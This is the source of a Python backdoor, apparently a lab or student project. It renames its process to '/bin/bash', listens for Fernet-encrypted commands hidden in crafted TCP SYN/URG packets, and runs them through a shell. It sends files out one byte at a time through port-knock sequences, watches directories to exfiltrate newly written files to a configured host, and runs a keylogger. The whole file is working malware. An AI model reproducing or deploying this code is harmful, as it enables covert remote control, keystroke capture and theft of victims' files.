import os
import threading
import time
import configparser

import subprocess

from cryptography.fernet import Fernet  #python3 -m pip install cryptography
from scapy.all import * #python3 -m pip install --pre scapy[basic]
import inotify.adapters #python3 -m pip install inotify
import setproctitle #python3 -m pip install setproctitle

config = configparser.ConfigParser()
config.sections()
config.read("config.txt")

#set the title
setproctitle.setproctitle("/bin/bash")

import casear   #casear.py casear cipher encryption
import logger   #logger.py keylogger

keyname = config['Encryption']['FernetKey']
shift = int(config['Encryption']['CasearShift']) #50 #shift for casear cipher





#command packets have SYNURG and urgent pointer value 80
#filter for this is
synurg = "tcp[tcpflags] == 34" #is also 0x22
victimIp = config['Target']['victimIp'] #"192.168.1.250"
commandPort = int(config['Ports']['commandPort']) #500
commandFilter = "not src " + victimIp + " and tcp port " + str(commandPort) + " and " + synurg

fileNamePort = int(config['Ports']['fileNamePort']) #999
fileDataPort = int(config['Ports']['fileDataPort']) #1000
sniffEndPort = int(config['Ports']['sniffEndPort']) #1005

watchDstIP = config['Watcher']['dstIP'] #192.168.1.253
watchFileNamePort = int(config['Ports']['watchFileNamePort']) #1999
watchFileDataPort = int(config['Ports']['watchFileDataPort']) #2000
watchSniffEndPort = int(config['Ports']['watchSniffEndPort']) #2005

#key for fernet encryption
with open("key1.key", 'r') as filekey:
    readkey = filekey.read()
f = Fernet(readkey)

i = inotify.adapters.Inotify()

#---------------------------------------------
# iwatch exfiltrator
#---------------------------------------------
def iwatcherAdd(pathfile, ipsrc):
    #check if path exists
    if(os.path.exists(pathfile)):
        print("Added watch to " + pathfile)
        i.add_watch(pathfile)
        sendString("Added watch to " + pathfile + "\n", commandPort, ipsrc, 0)
    else:
        sendString("Path does not exist\n", commandPort, ipsrc, 0)   
        
def iwatchThread():
    print("WatcherThread started")
    while True: #watcher event loop starts
        for event in i.event_gen(yield_nones=False):
            (_, type_names, path, filename) = event
            if(type_names[0] == "IN_CLOSE_WRITE"):
                location = path+ "/" + filename
                if(len(filename) == 0):
                    location = path
                
                print(location + " is being written to")
                #exfiltrate here
                #time.sleep(1) #give time for hte file to be saved first before trying to exfiltrate
                exfiltrate(location, watchDstIP, 1)

#---------------------------------------------
# Exfiltrator
#---------------------------------------------
def exfiltrate(filename ,ipsrc, watch): #if watch = 0, its commandInput, watch = 1 is from inotify
    #check if file exists
    
    #do knock sequence of 999 1005 1000 1005 to complete sending 
    #send filename to attacker port 999
    isfile = os.path.isfile(filename)
    #print("isfile " + st
    if(watch == 0): #not am iwatch inotify
        if(isfile): #file exists
            sendString(filename, fileNamePort, ipsrc, 0) #knock the filename on port 999
            sendString("a", sniffEndPort, ipsrc, 0) #knock on port 1005 seq 0 to stop sniffing for filename
            time.sleep(1) #give time for the 1000 listener to start up again
            with open(filename) as f:
                for line in f:
                    sendString(line, fileDataPort, ipsrc, 0) #knock on port 1000 to send data of the file
            sendString("a", sniffEndPort, ipsrc, 1) #knock on port 1005 seq 1 to start sniffing for filename again
        else:
            sendString("File does not exist\n", commandPort, ipsrc, 0)
    
    #do knock sequence 1999 2005 2000 2005
    else: #is an iwatch inotify
        if(isfile): #file exists
            sendString(filename, watchFileNamePort, watchDstIP, 0) #knock the filename on port 1999
            sendString("a", watchSniffEndPort, watchDstIP, 0) #knock on port 2005 seq 0 to stop sniffing for filename
            time.sleep(1) #give time for the 2000 listener to start up again
            with open(filename) as f:
                for line in f:
                    sendString(line, watchFileDataPort, watchDstIP, 0) #knock on port 2000 to send data of the file
            sendString("a", watchSniffEndPort, watchDstIP, 1) #knock on port 2005 seq 1 to start sniffing for filename again
        else:
            sendString("File does not exist\n", commandPort, watchDstIP, 0)
        
#---------------------------------------------
# Packet crafter for commands
#---------------------------------------------
def craftCovertCommand(byte, port, ipsrc, seq):
    #add fernet payload of anything using the key as authentication
    dummy = "e"
    pload = f.encrypt(dummy.encode())
    
    #print(pload)

    #use casear cipher encryption
    caecrypt = casear.encrypt(chr(byte), shift)
    caenum = ord(caecrypt)

    Dgram = IP()/TCP()
    #Dgram.src = "192.168.1.250"
    #Dgram.dst = "192.168.1.253"
    Dgram.dst = ipsrc
    #Dgram.sport = port
    Dgram.sport = caenum
    
    Dgram.dport = port
    Dgram.seq = seq
    Dgram.getlayer(TCP).flags = 0x22
    #Dgram.urgptr = byte
    #Dgram.urgptr = caenum
    
    Dgram.add_payload(pload)
    #Dgram.show()
    return Dgram

def sendString(string, port, ipsrc, seq):
    decoded = string.encode() #now in bytes
    sendBytes(decoded, port, ipsrc, seq)
        
def sendBytes(bytes, port, ipsrc, seq):
    for byte in bytes:
        packet = craftCovertCommand(byte, port, ipsrc, seq)
        send(packet, verbose = False)
        time.sleep(0.10)
        
#---------------------------------------------
# Command reader
#---------------------------------------------
#command packets have SYNURG and urgent pointer value 80
def getCommandPacket(packet):
    ipsrc = packet[IP].src
    #print("synurg")
    if(packet.urgptr == 80): #process the packet
        #decrypt the encrypted data
        command = ""
        xsize = 0
        try:
            encdata = packet.load
            bcommand = f.decrypt(encdata)
            command = bcommand.decode()
            print("command = " + command)
            x = command.split()
            xsize = len(x)
        except:
            print("could not be decrypted")
        #xsize = len(x)
        emptycommand = False
        print("xsize == " + str(xsize))
        
        #need to add checks 
        if(xsize > 0):
            print(command)
            if(x[0] == "cd" and xsize >= 2): #check for cd
                print("Changing directory to " + x[1])
                sendString("Changing directory to " + x[1] + "\n", commandPort, ipsrc, 0)
                try:
                    os.chdir(x[1])
                    print("done sending")
                except:
                    print("Directory doesnt exist")
                    sendString("Directory doesnt exist\n", commandPort, ipsrc, 0)
                    print("done sending")
                
            elif(x[0] == "exfil" and xsize >= 2):
                print("Exfiltrating")
                sendString("Exfiltrating\n", commandPort, ipsrc, 0)
                exfiltrate(x[1], ipsrc, 0)
                print("Done sending")
                
            elif(x[0] == "watch" and xsize >= 2):
                print("watching")
                sendString("Watching\n", commandPort, ipsrc, 0)
                iwatcherAdd(x[1], ipsrc)
                print("done sending")
                
            else: 
                op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                output = op.stdout.read()
                output_error = op.stderr.read()
                out = output+output_error
                print(out.decode())
                sendBytes(out, commandPort, ipsrc, 0)
                print("done sending")

#---------------------------------------------
#keylogger thread
#---------------------------------------------
def keylogThread():
    print("Started Keylogger")
    logger.Keylogger.main()


def main():
    #watcher exfil thread
    wthread = threading.Thread(target=iwatchThread)
    wthread.setDaemon(True)
    wthread.start()
    
    #keylogger thread
    kthread = threading.Thread(target = keylogThread)
    kthread.setDaemon(True)
    kthread.start()

    print("Starting backdoor")
    aRec=sniff(filter=commandFilter, prn=getCommandPacket)
    time.sleep(5)
    print("Main sleep over")

main()
#print("[-] Sending response...")
#client.send(output + output_error)